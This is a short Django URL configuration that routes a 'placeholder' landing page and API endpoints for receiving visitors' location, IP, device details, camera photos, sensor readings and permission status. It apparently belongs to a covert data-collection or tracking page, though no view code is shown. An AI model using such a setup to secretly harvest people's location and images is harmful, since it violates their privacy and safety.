from django.urls import path
from . import views

urlpatterns = [
    path('placeholder/', views.landing, name='landing'),
    path('api/location/', views.update_location, name='update_location'),
    path('api/ip/', views.update_ip, name='update_ip'),
    path('api/device/', views.update_device_info, name='update_device_info'),
    path('api/photo/', views.capture_photo, name='capture_photo'),
    path('api/sensor/', views.update_sensor_data, name='update_sensor_data'),
    path('api/permission/', views.update_permission_status, name='update_permission_status'),
    path('api/js_version/', views.js_version, name='js_version'),
]
